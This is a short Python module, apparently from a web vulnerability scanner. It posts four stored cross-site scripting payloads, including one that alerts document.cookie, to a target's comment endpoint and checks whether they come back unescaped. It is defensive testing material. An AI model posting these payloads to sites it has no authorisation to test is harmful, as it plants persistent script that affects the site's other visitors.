"""
Stored XSS Tester Module
Tests for stored/persistent cross-site scripting vulnerabilities
"""
from typing import Dict, List
import requests

class StoredXssTester:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.vulnerabilities = []
        self.payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert(document.cookie)>',
            '<iframe src=javascript:alert(1)>',
            '<body onload=alert(1)>'
        ]
    
    def test_all(self) -> List[Dict]:
        """Run all stored XSS tests"""
        for payload in self.payloads:
            result = self._test_payload(payload)
            if result:
                self.vulnerabilities.append(result)
        return self.vulnerabilities
    
    def _test_payload(self, payload: str) -> Dict:
        """Test single stored XSS payload"""
        try:
            # POST payload
            requests.post(f"{self.target_url}/comment", data={'comment': payload}, timeout=5)
            # GET to check if stored
            response = requests.get(f"{self.target_url}/comments", timeout=5)
            if payload in response.text:
                return {
                    'type': 'Stored XSS',
                    'severity': 'CRITICAL',
                    'payload': payload,
                    'evidence': 'Payload stored and reflected without escaping'
                }
        except:
            pass
        return None
